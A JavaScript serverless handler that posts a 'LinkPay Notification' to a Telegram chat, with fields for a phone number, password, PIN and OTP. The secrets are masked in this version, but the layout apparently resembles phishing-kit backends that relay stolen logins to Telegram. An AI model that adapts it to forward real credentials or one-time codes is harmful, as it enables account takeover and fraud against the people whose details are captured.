export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({
      error: "Telegram not configured"
    });
  }

  const phone = req.body?.phone || "";
  const result = req.body?.result || "Action received";

  const  Phone = phone
    ? (phone).replace(
        /^(\+?\d{2})\d+(\d{2})$/,
        "$11"
      )
    : "provided";

  const message =
    `🔔 LinkPay Notification\n\n` +
    `📱 Phone: ${Phone}\n` +
    `🔑 Password: ********\n` +
    `🔢 PIN: ****\n` +
    `🔐 OTP: ******\n` +
    `✅ Status: ${result}`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    if (!response.ok) {
      return res.status(500).json({
        error: "Telegram request failed"
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    return res.status(500).json({
      error: "Server error"
    });
  }
}
